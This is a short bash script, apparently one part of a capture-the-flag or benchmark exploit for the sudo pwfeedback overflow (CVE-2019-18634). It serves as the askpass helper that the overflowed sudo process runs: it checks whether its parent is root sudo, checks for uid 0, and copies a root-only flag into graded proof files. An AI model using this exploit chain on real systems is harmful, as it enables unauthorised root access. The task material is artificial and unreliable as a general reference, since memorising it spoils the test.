#!/bin/bash
#
# Attacker-controlled SUDO_ASKPASS helper for the CVE-2019-18634 reference
# exploit.  It is executed by the setuid-root sudo process from sudo_askpass()
# after that function drops to the credentials found in the overflowed
# `user_details` struct.
#
# It writes two machine-checkable proof files:
#   proof_intermediate.txt - proves the privileged sudo process executed us
#                            (this helper is running unprivileged)
#   proof_root.txt         - proves we are running with uid 0 (flag content)
#
# Environment (set by the exploit):
#   PROOF_DIR    directory for the proof files

PROOF_DIR="${PROOF_DIR:-/home/player/answer/proofs}"
mkdir -p "$PROOF_DIR" 2>/dev/null

# The parent is the sudo process.  /proc/<pid>/comm and /proc/<pid>/status
# are world-readable, unlike /proc/<pid>/exe.
parent_comm=$(cat "/proc/$PPID/comm" 2>/dev/null)
parent_euid=$(awk '/^Uid:/{print $3}' "/proc/$PPID/status" 2>/dev/null)

# Intermediate tier: our parent is the setuid-root sudo process.  We get here
# even though this helper itself is only running with the injecting user's
# privileges.
if [ "$parent_euid" = "0" ] && [ "$parent_comm" = "sudo" ]; then
    printf 'invoked_by_sudo=1 parent_euid=%s euid=%s uid=%s prompt=%s\n' \
        "$parent_euid" "$(id -u)" "$(id -u)" "$1" \
        > "$PROOF_DIR/proof_intermediate.txt"
fi

# Advanced tier: sudo dropped to uid 0, so we can read the root-only flag.
if [ "$(id -u)" = "0" ]; then
    cat /root/flag.txt > "$PROOF_DIR/proof_root.txt" 2>/dev/null
fi

# askpass protocol: emit the "password" on stdout.
echo "not-the-password"
